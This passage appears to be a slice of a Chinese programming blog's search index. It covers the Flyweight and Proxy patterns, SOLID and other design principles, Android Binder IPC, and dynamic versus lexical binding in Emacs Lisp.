运用共享技术有效地支持大量细粒度的对象。\n适用性 当以下情况都成立时，可以使用 Flyweight 模式：\n一个应用程序使用了大量的对象。 完全由于使用大量的对象造成很大的内存开销。 对象的大多数状态都可以变为外部状态。 如果删除对象的外部状态，那么可以用相对较少的共享对象取代很多组对象。 应用程序不依赖于对象标识。由于 Flyweight 对象可以被共享，所以两个逻辑上不同的对象，其物理上可能是同一个对象，因此应用程序不应该依赖对象标识的比较。 结构 相关模式 在实现 State 状态 模式和 Strategy 策略 模式时，如果涉及状态或策略较多的，可以考虑采用 Flyweight 模式来实现。\n代理 (Proxy) 意图 为其他对象提供一种代理以控制对这个对象的访问。\n不同类型的代理 远程代理（Remote Proxy） 为一个对象在不同的地址空间提供局部代表。Android 的 AIDL 生成的 Stub.Proxy 类就是这样一种代理。\n虚代理（Virtual Proxy） 按需创建开销较大的对象。\nCopy-on-write (COW) 优化\n这里拓展一下，还可以实现透明的 copy-on-write 优化。拷贝一个庞大而复杂的对象是一种开销很大的操作，如果这个拷贝根本没有被修改，那么这些开销就没有必要。用代理延迟这一拷贝过程，我们可以保证只有当这个对象被修改的时候才对它进行拷贝。\n保护代理（Protection Proxy） 控制对原始对象的访问。保护代理用于对象应该有不同的访问权限的时候。\n智能引用（Smart Reference） 取代简单的指针，它在访问对象时执行一些附加操作，典型用途包括：\n对指向实际对象的引用计数，这样当该对象没有引用时，可以自动释放它（也称为 Smart Pointer）。 当第一次引用一个持久对象时，将它装入内存。 在访问一个实际对象前，检查是否已经锁定了它，以确保其他对象不能改变它。 结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 Proxy +--------+ +---------+ | Client +-----------------\u003e+ Subject | +--------+ +---------+ | request | | ... | +---------+ ᐞ +---------------------------+ | | +-------+-----+ realSubject +----+----+ | RealSubject +\u003c---------------+ Proxy | +------------------------+ +-------------+ +---------+ | ... | | request | | request +------+ realSubject.request() | | ... | | ... | | ... | +-------------+ +---------+ +------------------------+ 相关模式 Adapter 适配器: 适配器为它所适配的对象提供一个不同的接口。相反，代理提供与它的实体相同的接口。 Decorator 装饰器: 装饰的实现部分和代理有点类似，但是目的不同。装饰为对象添加一个或多个功能，而代理则控制对对象的访问。另外实现上虽然有相似之处，但还是有些细微的差异。例如，Remote Proxy 并不包含对实体的直接引用，而只是一个间接引用（例如 Android AIDL 的例子）。 ","description":"\n","tags":["design-pattern","architecture"],"title":"\n设计模式：结构型 (Structural)","uri":"/posts/design-patterns-structural/"},{"categories":null,"content":" 前言 本文是笔者对软件设计原则、设计模式的一个梳理，很多内容参考自《设计模式：可复用面向对象软件的基础》一书（尤其是设计模式部分）。其中也包含了笔者个人的一些思考和总结。\n概念和术语 本章整理了一些容易混淆的概念和术语。\n对象间关系 先用一张 UML 图来直观展示一下：\n简单解释一下：\nInheritance 继承，这个很好理解，就是父类和子类的关系。 Composition 合成，这个是除了继承以外，两个对象之间所能有的最强的关系。合成意味着： Eye is a part of Dog, 即 Eye 是 Dog 不可分割的一部分。 Eye 的生命周期完且由 Dog 控制， Dog 消失则 Eye 也不复存在。 从实现上来说，一般 Eye 对象作为 Dog 的一个成员变量，且由 Dog 负责 Eye 的创建及其完整的生命周期管理。\nAggregation 聚合，关系强度次于 Composition 。其含义如下： 班级由全班学生组成，但学生不是班级不可分割的一部分（因为学生可以转学，但是班级会一直存在）。 两者的生命周期也不需要完且一致。一方面，学生可以辍学或者转学，但班级不受影响；另一方面，班级也可以解散或重组（比如合并到其他班），但学生仍然存在。 从实现上来说， Student 对象由 Class 对象所持有，且一般是通过 Class 的一个集合类成员变量所持有。\nAssociation 关联，关系强度再次之。其仅仅意味着 Has-A 的关系。单从对象持有的角度看，和 Aggregation 的差别不大，我个人觉得主要的区别可能有如下几点： Aggregation 会更强调“集体－个体”的关系一些，一般来说隐含了“一对多”的意思。 Association 是一种更加通用的“对象间持有关系”的描述，范围会比 Aggregation 更广。事实上， Aggregation 可以看作是 Association 的一种特例。 从实现上来说， VideoEditor 会持有一个 MediaCodec, 一般是通过一个成员变量来持有。\nDependency 依赖，这个应该是强度最弱的一种关系了，仅表示两者之间存在依赖关系，但并不限定两者之间是如何依赖的。例如，最弱的一种依赖可能是在 A 对象所属的类的某个方法里面使用到了 B 类。正如图中的示例，视频编辑器在加载某张图片素材的时候，可能在 loadImage() 方法中使用了 ImageDecoder, 但并不会在成员变量中持有该对象的引用。 下面这张图展示了 Association, Composition, Aggregation 三者之间的关系：\n设计原则 SOLID 原则 SOLID 指面向对象设计的五个基本原则：\nS​ingle-responsibility Principle 单一职责原则 O​pen-closed Principle 开闭原则 L​iskov Substitution Principle 里氏替换原则 I​nterface Segregation Principle 接口隔离原则 D​ependency Inversion Principle 依赖倒置原则 下面对这五个基本原则逐一进行介绍。\nSingle-responsibility Principle 单一职责原则 一个类应该只对一件事情负责。\n换句话说，就是​一个类应该只有一个引起变化的原因​。\n我们知道，对现有代码进行修改是很容易引起问题的。如果一个类具有两个或更多的引起修改的原因，那么将来这个类变化的几率将会大大上升。而且当它真正被修改时，你设计中的两个或多个方面都会受到影响（取决于该类的职责数量），不可控因素会进一步提高。同时，职责过多也会增加后续维护人员的理解成本。\n举个例子，比如设计模式中的迭代器模式，就帮助我们把对集合的遍历操作这项职责给剥离出来，使得集合内部只需关心集合自身功能的实现，而无需操心如何遍历集合元素这项功能。相反，如果我们直接在集合内部实现迭代功能，那我们就给了这个类两个变化的原因：\n如果集合本身的功能（例如元素的存储结构或操作）发生改变，这个类会被修改； 如果遍历的方式发生改变，这个类也会被修改。 因此，这个类将来被修改的机率大幅上升，增加了代码的不稳定因素。另外，由于这两项功能放在一起实现，彼此之间很可能会发生互相耦合，修改其中一项可能会导致另一项也需要修改，从而增加修改的复杂度和出错的概率。\n设计模式中还有很多模式都遵守了单一职责原则，例如抽象工厂将产品对象的构造这一职责独立出来，客户的可以直接通过工厂接口拿到产品接口，而无需关心具体产品是如何实现以及如何实例化的；再比如桥接模式，将抽象的设计部分和它所倚赖的实现部分分离，使二者可以独立发生变化，等等。\n另一个很有用的概念是分离关注点，这个概念和单一职责原则有点类似，但是角度不太一样。具体我们在分离关注点章节中进一步讨论。\nOpen-closed Principle 开闭原则 系统应该对扩展开放，对修改关闭。\n这里的关键词是“修改”。软件之所以要做设计，很大程度上就是因为需要应对未来的修改，换句话说，需要应对未来的变化。这种变化包括新增需求以及对现有需求的修改。\n为了适应这种变化，并且在适应变化的同时，保持系统的健壮性，我们必须考虑系统在它的生命周期内会发生怎样的变化。一个不考虑变化的设计，在将来很可能需要大规模重构，这意味着重新设计、开发和测试，以及依赖方的修改，这种代价是十分巨大的。\n坚持开闭原则不但能够帮助我们更好的适应变化，而且还有助于我们建立起稳定且高质量的『货架产品』。试想一下，如果我们的组件开发出来之后，不需要因为客户的需求而时常发生修改（只有日常维护、bugfix），在客户有新的需求时，都是通过扩展现有组件（继承或组合）、新增组件的方式来满足客户诉求，那么随着时间的推移，线上的场景验证、线下的测试覆盖会越来越多，现存组件的质量和稳定性会越来越高（因为 bugfix 在持续进行，且没有引入新的修改点）。这样持续发展下去，我们就可以建立一个高质量的组件库，即我们说的『货架产品』。\n当然，要做到这一点并不容易。这里整理一个大致的思路供参考：\n找出潜在的变化点​。在设计之初，从需求角度出发，考察模块中哪些部分将来可能会发生变化，把这些潜在的变化点找出来。\n对变化进行封装和隔离​。变化点找出来之后，思考一下，将来这些变化真正来临的时候，我们会如何支持？\n是否可以在不修改现有模块代码的前提下（可以新增代码，例如新写一个类），通过某种机制优雅的支持这种变化？例如在运行时替换某个对象，或者新增一个子类来自定义基类的部分行为？想清楚这点之后，我们就实现了对变化进行封装和隔离。\n上面是一个思路，具体应该如何做呢？ 设计模式为我们指明了道路。\n​设计模式可以确保系统能够以某种特定的方式发生变化​，从而帮助你在面临这种变化时避免重新设计。每一个设计模式都允许系统结构的某个方面的变化独立于其他方面，这样产生的系统可以更好地适应这种变化，从而更加健壮。进一步的阐述见常见的设计问题及相关模式应用、设计模式所支持的设计的可变方面两节。\n一款不能适应变化的软件是没有生命力的，而且注定会以失败告终，让我们积极拥抱变化😏。\nLiskov Substitution Principle 里氏替换原则 基类对象应该可以被子类对象无缝替换。\n除了明显的字面意思，这里从『基类设计者』和『子类实现者』两个角度，补充一点个人的理解。\n基类设计角度 基类在设计时，应该慎重定义可重写（ overwrite ）方法。每个 overwrite 方法都应该有明确的设计意图。 基类定义的每一个 overwrite 方法，都应该是有意为之，不能随便定义。例如，模板方法中开放出来的 overwrite 方法，是有意让子类重写整个算法流程中的某些步骤。\n慎重定义 overwrite 方法，可以有效防止 overwrite 方法语义混乱、用途不明确以及子类错误重写的问题，也可以降低子类实现者的心智负担。\n子类实现角度 子类在实现时，应该理解基类的工作机制，遵守基类的设计意图，严格按照继承协议来重写 overwrite 方法，并确保遵循里氏替换原则。 Interface Segregation Principle 接口隔离原则 提供多个分离的接口，而非提供一个宽泛用途的接口。\n提供隔离的接口至少有两方面的好处：\n从使用者的角度讲，互相隔离接口的接口相较一个大而全的接口，使用起来更加简单、高效，可以有效减少误用，同时降低使用者的心智负担； 从设计者的角度讲，提供相互隔离的接口除了有利于保持组件接口的简洁清晰，同时还会迫使设计者思考清楚系统的核心（原子）接口是什么，从而在机制层面对系统的设计思考的更加透彻一些，而不是 case by case 的提供业务所需要的各项功能。 实际上，由于分离接口也意味着分离职责，因此该原则也暗合单一职责原则。\nDependency Inversion Principle 依赖倒置原则 依赖抽象，不要依赖具体实现。\n高层组件不应该依赖低层组件 不管高层组件或低层组件，两者都应该依赖抽象，而非具体实现 考虑这样一个例子，假设我们有一款视频编辑器，其中有一项贴纸功能，允许用户选择不同类型的贴纸，比如有静态贴纸、动态贴纸等。\n多种贴纸类型意味着有多个贴纸的实现类，例如：\nStaticSticker 支持单张图片的静态贴纸 AnimatedSticker 支持图片序列帧的动态贴纸 贴纸类型不同，使用方式也有所不同。例如，静态贴纸只需一张图片，以及贴纸的绘制区域、起始时间、结束时间；而动态贴纸需要一个序列帧，而且该序列帧的时间间隔可能是固定的，也可能是不固定的。如果在编辑器的主程序中直接使用这两个未经抽象的贴纸实现类，结果可能是灾难性的：\n由于主程序需要关注具体的贴纸实现类，导致我们在主程序中引入了一个新的引起变化的原因（参考单一职责原则）,后续需要扩展新的贴纸，或者某个贴纸实现需要调整时，都可能会引起主程序的修改； 由于不同贴纸的使用逻辑（接口）可能不同，主程序中可能会充斥着各种 if else 或者 switch case 的分支语句，在扩展新贴纸，或者调整贴纸工作流程的时候，会引发 Shotgun Surgery 霰弹式修改 (参考《重构》3.6 章)。 如何解决该问题？答案就是 依赖倒置 。我们应该依赖 Sticker 的抽象接口，而不能直接依赖不同贴纸的具体实现类。具体如何做到呢？下面提供一个思路供参考。\n对贴纸进行抽象设计，得到贴纸接口 Sticker 仔细分析贴纸的需求，我们发现大致可以定义出如下几个接口：\ngetStartTime() - 获取起始时间 getEndTime() - 获取结束时间 getRect() - 获取绘制区域 getImageAtTime() - 获取任意时刻的图片 有了上述几个接口，主程序就能够实现基本的贴纸绘制流程了。因此，主程序就可以脱离对贴纸具体实现的依赖，转变成依赖抽象接口 Sticker 了。\n有了 Sticker 之后，我们会发现其实还不太够。因为我们仍然需要在主程序中构造出具体的某个贴纸，不同贴纸的构造逻辑可能是不同的，而且后续可能会发生变化，因此，这仍然会导致对具体实现的依赖。如何摆脱这种依赖？我们进一步将对象的构造过程进行抽象，抽象出一个 StickerFactory 接口：\ncreateSticker(): Sticker 创建某种类型的贴纸，并返回 Sticker 接口 有了上述两个接口，主程序算是彻底摆脱了对贴纸具体实现类的依赖了，且双方都可以独立对实现进行调整，而不会互相产生影响。\n也许你可能会问，那 StickerFactory 对象又如何构造呢？这个对象其实可以委托给贴纸选择程序来构造，也就是说，在用户选中某一款贴纸时，该贴纸的类型其实已经确定了，在这里可以恰当的构造出具体所需要的 StickerFactory （ StaticStickerFactory 或者 AnimatedStickerFactory 实例）。\n这个例子讲完了，看起来是不是很眼熟？没错，这就是抽象工厂模式的一个应用。下面附上这个例子的类图，方便理解：\nSeparation of Concerns 分离关注点 分离关注点是指将软件划分为若干个彼此独立的单元，每个单元处理一个分离的关注点，不同单元之间保持隔离，仅通过定义良好的接口进行通信。\nSeparation of Concerns , 简称 SoC 。相比单一职责原则来说，我觉得分离关注点的概念会更通用化一些，更多强调了如何降低开发者的心智负担。例如，我在开发 A 模块的时候，可以不用操心其他 B/C/D 模块的任何细节，可以专注投入到 A 模块的开发工作上，这样效率最高，而且不容易出错。\n另外， SoC 除了表达单一职责的内涵，还隐含了单个模块应该足够内聚，模块之间应该尽量解耦，只能通过定义明确的接口来通信等意思，否则是做不到分离关注点的。\n这个概念可以涵盖到多个不同的层面，可以小到一个函数、一个类的划分，大到一个模块、一个子系统，也可以是软件的分层设计。例如 TCP/IP 协议模型，就是一个典型的符合 SoC 原则的设计。\nLaw of Demeter 最少知识原则 也叫迪米特法则，是指一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块之间相对独立。这样，当修改某一个模块时，就会尽量少的影响到其他模块，扩展也会相对更加容易。\n这其实是对软件实体之间的通信进行约束，其本质是要求我们在进行软件设计时，要做到实体内部的​高内聚, 以及实体之间的​低耦合​。\n例如在 Android 开发过程中，如果是采用 MvvM 架构，比较好的实践是尽可能的把你的 Model 层逻辑，甚至是 ViewModel 层逻辑做到平台无关，即 保持对平台的最少知识（依赖),这样做至少有如下好处：\n可以确保你尊循了 MvvM 架构规范， Model \u0026 ViewModel 层不会对 View 层有直接的依赖。 ViewModel 和 View 之间仅保持数据发布/订阅的关系，不对 View 产生直接依赖。在 Android 平台， 避免 ViewModel 对 View 层的依赖十分必要，这可以避免很多生命周期方面的问题（因为 ViewModel 比 View 层的对象往往具有更长的生命周期）。 你的 Model \u0026 ViewModel 和平台无关，具备足够的灵活性。例如在 Android SDK 发生变更或者手机厂商行为不一致时，可以更容易的在上层做适配，而无需修改核心业务逻辑。 整个系统的可测试性将大幅提升， Model \u0026 ViewModel 都可以进行独立的单元测试，而且这种​单元测试是可以脱离 Android 设备或者 Android 模拟器独立进行​的，即可以直接在 PC 上跑，测试、调试效率也得到了大幅提升。 关于 ViewModel 的单元测试可以参考官方的这篇 Codelab 示例。\nComposite Reuse Principle 组合复用原则 多用组合(HAS-A)，少用继承(IS-A)。\n采用组合的方式来实现新功能，有如下好处：\n类之间的耦合更低 由于继承属于 白箱复用 ,父类的内部细节对子类基本是可见的，这种复用方式在某种程度上破坏了父类的封装性，一旦父类的实现发生变化，子类很有可能面临修改。而组合属于 黑箱复用 ,在复用时仅依赖其外部稳定接口，内部实现细节对客户来说是不可见的。因此，组合的方式明显具有更低的耦合性。 更加简单，不容易出错 继承需要对父类的工作机制有一定的了解，一旦对 overwrite 方法（或属性）的设计意图产生错误理解，很容易导致难以预料的后果（参考里氏替换原则）。组合则相对简单一些，只需理解 public 接口即可。 不会产生庞大而不可控的继承体系 如果滥用继承，很容易导致一个庞大的继承体系，到最后没有人能真正搞懂整个系统是怎么工作的，改代码变得如履薄冰。而采用组合则不会有这个问题。 另外，组合相比继承需要的知识更少，这点和最少小知识原则也是相符的。\n其他原则 这里列一些可能并不是大家所公认的，但我个人觉得做设计时应该放在心上的“原则”。\n优先考虑可测试性 在做设计时，优先考虑可测试性。这样做有如下好处：\n降低编写单元测试的难度。如果一开始没有考虑到可测试性，往往可能会导致后续编写单元测试的成本较高，甚至可能出现为了编写单元测试而不得不重构现有设计的情况。 有利于提高设计的灵活性，促进产生高内聚、低耦合的系统。如果一开始就考虑整个系统、模块的可测试性，往往可以启发我们做出更灵活的设计，并且促使我们设计出更具“高内聚、低耦合”特点的系统。 KISS 原则 Keep It Simple and Stupid.\n尽可能让你的设计保持简洁易懂。我觉得主要有如下几个方面：\n尽量避免引入新概念\n每个概念都有学习成本，应该尽可能复用软件工程中，或者行业领域内现有的概念体系。\n避免过度设计\n设计是为了应对变化，对于不太可能发生变化（或者变化可控）的部分，应该尽量保持简单。\n一件事情只保留一种最佳做法\n对于同一件事件，你的设计最好只保留一种达成的途径，而且是最佳的途径。\n尽量让用户少做选择，选择意味着成本，也意味着可能犯错。\n这点有时候可能和灵活性会有些冲突，需要对具体的需求做出权衡考虑。但至少可以在保留灵活性的同时，提供一些缺省的设置或工作模式，或者做一些分层设计，这样可以让那些不需要定制化功能的用户做最少的选择，就像Facade 模式中所做的那样。\n设计模式 模式的分类 根据模式的目的和范围，可以将设计模式大致划分为如下类别：\n      \n      \n             \n      \n                                 目的                            创建型              结构型     行为型                         \n 范围 \n      \n      \n      \n      \n      \n      \n      \n      \n      \n             \n  类    Factory Method   \n                     Adapter  \n             Interpreter             \n Template Method                \n      \n      \n 对象 \n      \n      \n      \n      \n                         \n Abstract Factory \n Builder          \n Prototype        \n Singleton        \n                  \n                  \n                  \n                              \n Adapter   \n Bridge    \n Composite \n Decorator \n Facade    \n Flyweight \n Proxy     \n             Chain of Responsibility \n Command                 \n Iterator                \n Mediator                \n Memento                 \n Observer                \n State                   \n Strategy                \n Visitor                  按目的分类：\n创建型 与对象的创建有关。 结构型 处理类或对象的组合。 行为型 对类或对象怎样交互、怎样分配职责进行描述。 按范围分类：\n类模式 处理类和子类之间的关系，这些关系通过继承建立，是静态的，在编译时就确定下来了。 对象模式 处理对象之间的关系，这些关系在运行时是可以变化的，更具动态性。其实从某种意义上来说，几乎所有模式都使用继承机制，所以『类模式』只指那些集中于处理类间关系的模式，而大部分模式都属于对象模式的范畴。 创建型类模式将对象的部分创建工作延迟到子类，而创建型对象模式则将它延迟到另一个对象中。结构型类模式使用继承机制来组合类，而结构型对象模式则描述了对象的组装方式。行为型类模式使用继承描述算法和控制流，而行为型对象模式则描述了一组对象怎样协作完成单个对象所无法完成的任务。\n常见的设计问题及相关模式应用 前面在开闭原则中提到设计应该支持变化，下面介绍一些导致重新设计的一般原因，以及解决这些问题的设计模式：\n通过显式指定一个类来创建对象\n在创建对象时指定类名会使得你受到特定实现的约束，而不是特定接口的约束。要避免这种情况，应该间接地创建对象。\n设计模式：Abstract Factory 抽象工厂, Factory Method 工厂方法, Prototype 原型。\n对特殊操作的依赖\n当你为请求指定一个特殊的操作时，完成该请求的方式就固定下来了。为了避免把请求代码写死，你应该在编译时或者运行时支持对这种请求的响应方式进行修改。\n设计模式：Chain of Responsibility 责任链, Command 命令。\n对硬件和软件平台的依赖\n外部的操作系统接口和应用编程接口（API）在不同的软硬件平台上是不同的。依赖于特定平台的软件将很难移植到其他平台上，甚至很难跟上本地平台的更新。所以设计系统时限制其平台相关性就很重要了。\n设计模式：Abstract Factory 抽象工厂, Bridge 桥接。\n对对象表示或实现的依赖\n知道对象怎样表示、保存、定位或实现的客户在对象发生变化时可能也需要变化。对客户隐藏这些信息能阻止连锁变化。\n设计模式：Abstract Factory 抽象工厂, Bridge 桥接, Memento 备忘录, Proxy 代理。\n算法依赖\n算法在开发和复用时常常被扩展、优化和替代。依赖于某个特定算法的实体在算法发生变化时不得不变化。因此有可能发生变化的算法应该被独立出来。\n设计模式：Builder 生成器，Iterator 迭代器，Strategy 策略，Template Method 模板方法，Visitor 访问者。\n紧耦合\n紧耦合的类很难独立地被复用，因为它们是互相依赖的。紧耦合产生单块的系统，要改变或删掉一个类，你必须理解和改变其他许多类。这样的系统是一个很难学习、移植和维护的密集体。\n松散耦合提高了一个类本身被复用的可能性，并且系统更易于学习、移植、修改和扩展。设计模式使用抽象耦合和分层技术来提高系统的松散耦合性。\n设计模式：Abstract Factory 抽象工厂，Command 命令，Facade 外观，Mediator 中介者，Observer 观察者， Chain of Responsibility 责任链。\n滥用继承\n通过定义子类来扩充功能是一种比较笨拙的方式，而且极容易导致子类数量爆炸。定义子类还需要对父类有深入的了解，成本较高、容易犯错且耦合紧密。一旦出现两个维度的定制化信息，极容易导致子类数量爆炸，从而导致整个系统变得难以维护。\n对象组合技术是继承之外构建新功能的另一种灵活方法。新的功能可以通过以新的方式组合已有对象来实现。另一方面，过多使用对象组合也可能会导致设计难以理解。因此，许多设计模式往往会将两者结合起来，例如定义一个子类，并将它的实例和已存在实例进行组合来引入定制的功能。\n设计模式：Bridge 桥接，Chain of Responsibility 责任链，Composite 组合， Decorator 装饰器，Observer 观察者，Strategy 策略。\n不能方便地对类进行修改\n有时你不得不改变一个难以修改的类。也许这个类不属于你维护，你没有源代码，或者对类的修改会导致很多其他依赖方的改动。设计模式提供了在这些情况下对类进行修改的方法。\n设计模式：Adapter 适配器，Decorator 装饰器，Visitor 访问者。\n设计模式所支持的设计的可变方面 目的 设计模式 可变的方面 创建 抽象工厂 (Abstract Factory) 产品对象家族 生成器 (Builder) 如何创建一个组合对象 工厂方法 (Factory Method) 被实例化的子类 原型 (Prototype) 被实例化的类 单例 (Singleton) 一个类的唯一实例 结构 适配器 (Adapter) 对象的接口 桥接 (Bridge) 对象的实现 组合 (Composite) 一个对象的结构和组成 装饰器 (Decorator) 对象的职责,不生成子类 外观 (Facade) 一个子系统的接口 享元 (Flyweight) 对象的存储开销 代理 (Proxy) 如何访问一个对象 行为 责任链 (Chain of Responsibility) 响应请求的对象 命令 (Command) 何时、怎样满足一个请求 解释器 (Interpreter) 一个语言的文法及解释 迭代器 (Iterator) 如何遍历、访问一个集合的各元素 中介者 (Mediator) 对象间怎样交互、和谁交互 备忘录 (Memento) 一个对象中哪些私有信息存放在该对象之外,以及何时进行存储 观察者 (Observer) 多个对象依赖于另一个对象,而这些对象又如何保持一致 状态 (State) 对象的状态 策略 (Strategy) 算法 模板方法 (Template Method) 算法中的某些步骤 访问者 (Visitor) 某些可作用于一组对象上的操作，且无需修改这些对象的类 ","description":"\n","tags":["architecture","design-pattern","android"],"title":"\n软件设计原则、设计模式总结","uri":"/posts/design-patterns/"},{"categories":null,"content":"同步调用 IBinder 接口相关的关键 API 主要有两个：\nIBinder.transact() 用来向一个 IBinder 对象发起调用请求。 Binder.onTransact() 用于处理 Binder 对象收到的调用。 请注意，这套 transaction API 是一套 同步 API, 即一个 transact() 调用会一直阻塞，直到对面的 Binder.onTransact() 方法返回之后， transact() 调用才会返回。\n之所以这么设计，是因为 IBinder 同时支持两种调用方式：\n本地进程调用 和调用本地方法类似，用户期待的行为就是同步调用。 远程 IPC 调用 跨进程情况下，Android 底层 IPC 机制保证和本地调用有同样的语意。 本地进程调用的情况下，用户期待的行为就是同步调用。因此，IPC 也采用同样的策略，这样可以保证在业务进行重构（例如拆分多进程）时不受影响。\n线程池机制 系统在每个进程中都维护了一个“事务线程池” (a pool of transaction threads), 这些线程用于分发所有的来自其他进程的 IPC 调用。\n正因如此，​AIDL 接口的实现必须是线程安全的​。类似地，​ContentProvider 方法（query()、 insert()、delete()、update() 和 getType() 方法）也必须实现为线程安全的方法。\n参考示意图如下：\n调用时序图：\n如前所述，对于 process A 来说，整个调用是一个同步等待的过程。\n进程间递归调用 Binder 系统还支持进程之间的递归调用。例如：\n假设 process A 在主线程向 process B 发起一个 transact() 请求，我们称为 transact 1 吧； process B 在自己的线程池中处理 binder 请求时（即 onTransact() 方法），又向 process A 发起了一个 transact() 请求，我们称为 transact 2 ； 此时 process A 的主线程还在等待自己发出的 transact() 的响应，仍处于阻塞状态（参考同步调用）。不过由于 Android 会自动在 process A 中维护一个线程池，用于这类处理 IPC 请求，因此 transact 2 可以得到正常处理，处理完之后，正常返回到进程 B 中； 返回进程 B 后，继续处理 transact 1, 然后返回 process A, 结束 transact 1 的调用。 试想一下，如果系统不维护一个线程池来处理这类 IPC 请求，那在 process B 递归的向 process A 发起 IPC 请求时，这两个进程可能就被卡死了。\n上述过程是不是有点像在模拟一个本地的递归调用？事实上，和同步调用类似，之所以这么设计，也是为了尽量让上层应用对“IPC 调用”这件事情保持透明，底层可以任意切换组件的物理布局，而不影响上层的业务调用。\n上述过程可以参考如下时序图：\n远程对象生命周期检测 和 IBinder 这类远程对象协同工作时，很重要的一点是对其生命周期的感知。一旦远程对象所在的进程被销毁了，该远程对象也会成为一个无效对象。\n系统提供了如下几种方式用于 IBinder 对象的生命周期检测：\nRemoteException 当 IBinder 对象所在的进程已经被销毁时，调用 IBinder.transact() 方法会抛出该异常。 IBinder.pingBinder() 该方法返回 false 表示其所在进程已销毁。 IBinder.linkToDeath() 可用于注册一个 DeathRecipient 对象，用来接收进程销毁时的回调。 参考资料 IBinder.java 源码 Binder.java 源码 ","description":"\n","tags":["android"],"title":"\nAndroid 的 Binder 机制","uri":"/posts/android-binder/"},{"categories":null,"content":"今天读了一篇讲 dynamic binding 和 lexical binding 的文章： Dynamic Binding Vs Lexical Binding，讲的挺清楚的，这里大致翻译如下。\n绑定 binding 的概念 绑定是名字和值的一种对应关系。在 Lisp 中，可以用 let 来创建绑定：\n1 2 (let ((a 1)) (print a)) ;; ==\u003e 1 这里将 name a 绑定到 value 1 上。\nlet 表达式其实只是一个“语法糖”，和 lambda 表达式是等价的。例如：\n1 2 3 (let ((a 1) (b 3)) (+ a b)) 等价于：\n1 ((lambda (a b) (+ a b)) 1 3) 当然，除了 let 之外，还有很多其他的方法可以创建 bindings, 例如 defconst, defun, defvar, flet, labels, prog, 等等。\n动态绑定和词法绑定 在处理变量绑定时，有两种方式：\ndynamic 动态绑定，所有的变量名及它们的值都存在一张全局表中。 lexical 词法绑定，每个绑定作用域（binding scope），包括 defun/let 等，都会创建一张新的表，用于存放变量和值，这些表组织成一个层次结构，被称为 “the enviroment”。 在上面给出的那些简单的例子中，lexical 和 dynamic binding 之间并没有什么区别，返回的结果是一样的。\n但是在一些复杂情况下，情况则有所不同。例如：\n1 2 3 4 5 6 (let ((a 1)) ; binding (1) (let ((f (lambda () (print a)))) (let ((a 2)) ; binding (2) (funcall f)))) ;; dynamic binding ==\u003e 2 ;; lexical binding ==\u003e 1 如果是 lexical binding ，在访问变量时，会在 lexical enviroment 中查找绑定，也就是说，在变量的代码块范围内查找。当在 lexical enviroment 中有多个绑定同时存在时，选择最内层的那个。\n因此，如果是 lexical binding，上述代码会打印 “1”，因为只有 binding (1) 在 lexical enviroment 中。\n如果是 dynamic binding, 在访问变量时只会在 dynamic enviroment 中查找，也就是说，在所有的绑定中查找，包括从程序启动之后创建的所有绑定（只要没被销毁）。如果同时存在多个绑定，则使用运行时最近创建的那个（我想这就是 dynamic 一词的由来）。\n因此，如果是 dynamic binding，上述代码会打印 “2”，因为当 a 求值时，binding (1) 和 binding (2) 都被创建了，但是 binding (2) 才是最近创建的。\n在多线程 Lisp 中，关于 dynamic binding 我们需要更加小心一点，因为要确保一个线程不会看到（访问到）另一个线程所创建的 bindings。由于 EmacsLisp 是单线程的，所以不用担心。\n动态绑定的优点 动态绑定可以很方便的修改子系统的行为。\n这里举一个例子。假设你有一个 foo 的函数，该函数会利用 print 产生一些输出，你希望可以将该输出捕获到一个 buffer 中。通过 dynamic binding，可以很轻松的实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ;; get-buffer-create 获取或创建一个指定名字的 buffer，注意名字前面有一个空格，表 ;; 示该 buffer 不保留 undo 历史 (let ((b (get-buffer-create \" *string-output*\"))) ;; 修改 standard-output 变量，将标准输出重定向到 buffer b 中。注意：该修改仅在 ;; 该 let 的作用域范围内生效 (let ((standard-output b)) ;; 该输出会重定向到 buffer b 中 (print \"foo\")) ;; 切换当前 buffer 为 b，仅用于编辑，不会展示该 buffer (set-buffer b) (insert \"bar\") ;; 返回当前 buffer 的内容 (buffer-string)) 如果你经常使用类似的功能，你应该将其封装在一个 macro 中 —— 幸运的是，已经有这样的封装了： with-output-to-temp-buffer 。\n由于 foo （这里其实是 print 函数）使用的 standard-output 是 dynamic binding 的，因此你可以替换成你自己的绑定，以此来修改 foo 的行为 —— 以及 foo 所调用的所有 functions 的行为。\n在一个不支持 dynamic binding 的语言中，你大概需要给 foo 增加一个可选参数来指定一个 buffer，然后 foo 需要传递该参数给所有的 print 调用。如果 foo 还调用了其他函数，并且这些函数也调用了 print ，那么你同样需要修改所有这些参数（注意：这是一个递归的过程）。\nRichard Stallman 在 EmacsLisp 的上下文中解释了动态绑定的优点：Emacs Paper - Dynamic Binding 。另请参阅 Pascal Costanza 写的文章 Dynamic vs. Static Typing — A Pattern-Based Analysis 。\n词法绑定的优点 MilesBader 的这封邮件讲的很清楚，这里摘抄并翻译如下：\nFrom: MilesBader\nSubject: Re: Emacs 22\nNewsgroups: comp.emacs\nDate: Sun, 19 Aug 2001 01:47:53 GMT\nBecause it’s (1) much easier for the user [that is, programmer], because it eliminates the problem of which variables lambda-expressions use (when they attempt to use variables from their surrounding context), and (2) much easier for the compiler to optimize, because it doesn’t need to worry about variables escaping their lexical context, and so doesn’t need to allow for the possibility (this is a big problem with the current compiler).\n因为它（1）对于程序员来讲，要简单很多，因为它消除了 lambda 表达式使用哪些变量的问题（当他们尝试使用外围环境的变量时），（2）对于编译器来说，优化起来要简单很多，因为它不需要担心变量从词法上下文中逃逸出去，因此不需要考虑这种逃逸出去的可能性（这是当前编译器的一个大问题）。\n语言 大部分语言只支持 lexical binding 。\nEmacsLisp 从 24.1 版本开始同时支持 dynamic binding 和 lexical binding 。 Lexical binding 需要在一个文件或 buffer 中显式启用（见下文）。通过 defvar 定义的变量为“special”变量，即永远是动态绑定的（即使该文件启用了 lexical binding）。 CommonLisp 同时支持 dynamic binding 和 lexical binding 。 默认为 lexical binding，通过 defvar 或 declare 创建的一个变量即为“special”的动态绑定变量。 使用词法绑定 要在 EmacsLisp 中使用词法绑定，需要在文件头中设置 file-local 变量 lexical-binding 为 t ，且必须在文件的第一行中设置：\n1 ;;; -*- lexical-binding: t -*- ","description":"\n","tags":["elisp","emacs"],"title":"\n动态绑定（Dynamic Binding）和词法绑定（Lexical 